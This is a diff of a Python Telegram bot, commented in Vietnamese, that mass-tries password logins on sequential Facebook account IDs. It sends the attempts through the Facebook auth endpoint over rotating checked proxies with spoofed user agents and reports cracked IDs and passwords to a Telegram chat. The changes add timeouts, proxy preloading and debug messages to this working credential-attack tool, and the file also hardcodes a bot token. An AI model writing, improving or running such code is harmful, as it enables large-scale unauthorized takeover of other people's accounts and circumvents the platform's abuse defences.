@@ -9,7 +9,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # ---------- Cấu hình ----------
-TOKEN="8377931268:AAGkN2B6OVjamYf7kskT0wgoM9S2Hp9waUQ"
+TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8377931268:AAGkN2B6OVjamYf7kskT0wgoM9S2Hp9waUQ")
 
 # ---------- Biến toàn cục ----------
 loop_count = 0
@@ -19,22 +19,20 @@ scan_task = None
 proxy_pool = []          # danh sách proxy sống
 proxy_lock = asyncio.Lock()  # tránh đọc/ghi đồng thời
 
-# ---------- Hàm kiểm tra proxy ----------
+# ---------- Hàm kiểm tra proxy (có timeout) ----------
 def check_proxy(proxy_str):
-    """Trả về True nếu proxy sống."""
     try:
         proxies = {
             "http": f"http://{proxy_str}",
             "https": f"http://{proxy_str}",
         }
-        # Kiểm tra bằng httpbin (nhẹ, trả về IP)
         r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
         return r.status_code == 200
     except:
         return False
 
 async def load_live_proxies():
-    """Đọc proxy.txt, kiểm tra và cập nhật proxy_pool."""
+    """Đọc proxy.txt, kiểm tra và cập nhật proxy_pool (chỉ gọi 1 lần khi cần)."""
     global proxy_pool
     async with proxy_lock:
         if not os.path.exists("proxy.txt"):
@@ -49,7 +47,7 @@ async def load_live_proxies():
             return 0
 
         # Kiểm tra đồng thời bằng ThreadPoolExecutor
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         with ThreadPoolExecutor(max_workers=20) as pool:
             results = await asyncio.gather(
                 *[loop.run_in_executor(pool, check_proxy, p) for p in raw]
@@ -59,7 +57,7 @@ async def load_live_proxies():
         proxy_pool = live
         return len(live)
 
-# ---------- Hàm login (giữ nguyên logic method A) ----------
+# ---------- Hàm login (method A) ----------
 def window1():
     """Random User‑Agent giả Windows."""
     aV = str(random.choice(range(10, 20)))
@@ -107,10 +105,9 @@ def creationyear(uid):
     else: return ''
 
 def attempt_login(uid, proxy_str=None):
-    """Thử đăng nhập method A. Trả (uid, pass, year) nếu OK, else None."""
+    """Thử đăng nhập method A, timeout 10s."""
     global loop_count, oks
     session = requests.Session()
-    # Thiết lập proxy nếu có
     if proxy_str:
         session.proxies = {
             "http": f"http://{proxy_str}",
@@ -162,7 +159,8 @@ def attempt_login(uid, proxy_str=None):
                 'https://b-graph.facebook.com/auth/login',
                 data=data,
                 headers=headers,
-                allow_redirects=False
+                allow_redirects=False,
+                timeout=10      # <-- THÊM TIMEOUT
             ).json()
             if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 year = creationyear(uid)
@@ -170,7 +168,7 @@ def attempt_login(uid, proxy_str=None):
                 oks.append(uid)
                 return (uid, pw, year)
         loop_count += 1
-    except Exception:
+    except Exception as e:
         loop_count += 1
     return None
 
@@ -178,15 +176,20 @@ def attempt_login(uid, proxy_str=None):
 async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
     global stop_flag, loop_count, oks, proxy_pool
     executor = ThreadPoolExecutor(max_workers=100)
-    batch_size = 1000
+    batch_size = 100   # tạm giảm để test, sau tăng lên 1000
     star = '10000'
 
-    # Chỉ load proxy 1 lần duy nhất khi bắt đầu
-    count = await load_live_proxies()
-    if count == 0:
-        await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
+    # Chỉ load proxy nếu chưa có
+    if not proxy_pool:
+        count = await load_live_proxies()
+        if count == 0:
+            await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
+        else:
+            await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống.")
     else:
-        await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống, bắt đầu quét...")
+        await context.bot.send_message(chat_id, f"🔄 Sử dụng {len(proxy_pool)} proxy có sẵn.")
+
+    await context.bot.send_message(chat_id, "🚀 Bắt đầu quét...")
 
     while not stop_flag:
         # Tạo batch UID
@@ -196,16 +199,15 @@ async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
             uid = star + suffix
             ids.append(uid)
 
-        # Log mỗi 5 batch
-        if loop_count % (batch_size * 5) == 0:
-            await context.bot.send_message(
-                chat_id,
-                f"> 🔄 Đang quét...\n> Tổng loop: {loop_count}\n> OK: {len(oks)}",
-                parse_mode=ParseMode.MARKDOWN_V2
-            )
+        # Log debug mỗi batch
+        await context.bot.send_message(
+            chat_id,
+            f"🔍 Đang quét batch ({len(ids)} UID)... loop={loop_count}",
+            disable_notification=True
+        )
 
         # Lấy proxy ngẫu nhiên cho mỗi UID
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         tasks = []
         for uid in ids:
             proxy = random.choice(proxy_pool) if proxy_pool else None
@@ -225,7 +227,6 @@ async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
                 )
                 await context.bot.send_message(chat_id, msg, parse_mode=ParseMode.MARKDOWN_V2)
 
-        # Nghỉ ngắn để tránh quá tải
         await asyncio.sleep(0.5)
 
     executor.shutdown(wait=False)
@@ -242,7 +243,7 @@ async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_flag = False
     application = context.application
     scan_task = application.create_task(scan_loop_wrapper(chat_id, context))
-    await update.message.reply_text("✅ Bắt đầu quét vô hạn (method A). Dùng /stop để dừng.")
+    await update.message.reply_text("✅ Lệnh /scan đã nhận, bot sẽ sớm bắt đầu...")
 
 async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global stop_flag, scan_task
@@ -250,7 +251,7 @@ async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if scan_task:
         scan_task.cancel()
         scan_task = None
-    await update.message.reply_text("🛑 Đang dừng...")
+    await update.message.reply_text("🛑 Đã yêu cầu dừng.")
 
 async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global loop_count, oks, proxy_pool
@@ -262,25 +263,22 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
 
 async def ipprx_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lọc proxy sống và gửi file."""
     await update.message.reply_text("🔎 Đang kiểm tra proxy... Vui lòng đợi.")
     count = await load_live_proxies()
     if count == 0:
         await update.message.reply_text("⚠️ Không có proxy sống.")
         return
 
-    # Ghi proxy sống ra file tạm
     with open("live_proxies.txt", "w") as f:
         for p in proxy_pool:
             f.write(p + "\n")
 
-    # Gửi file
     with open("live_proxies.txt", "rb") as f:
         await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=f,
             filename="live_proxies.txt",
-            caption=f"🌐 Danh sách {count} proxy sống đã lọc."
+            caption=f"🌐 {count} proxy sống."
         )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -294,7 +292,16 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN_V2)
 
-# ---------- Main ----------
+# ---------- Khởi tạo proxy khi bot start ----------
+async def on_startup(app):
+    # Load proxy ngay khi bot khởi động (nếu cần)
+    global proxy_pool
+    if os.path.exists("proxy.txt"):
+        await load_live_proxies()
+        print(f"Đã nạp {len(proxy_pool)} proxy sống.")
+    else:
+        print("Không tìm thấy proxy.txt")
+
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("scan", start_scan))
@@ -303,6 +310,9 @@ def main():
     app.add_handler(CommandHandler("ipprx", ipprx_cmd))
     app.add_handler(CommandHandler("help", help_cmd))
 
+    # Chạy on_startup sau khi app được tạo
+    app.job_queue.run_once(lambda ctx: asyncio.create_task(on_startup(app)), when=0)
+    # Hoặc dùng app.post_init = on_startup (nếu dùng PTB>=20.0)
     print("🤖 Bot đã khởi động...")
     app.run_polling()
 
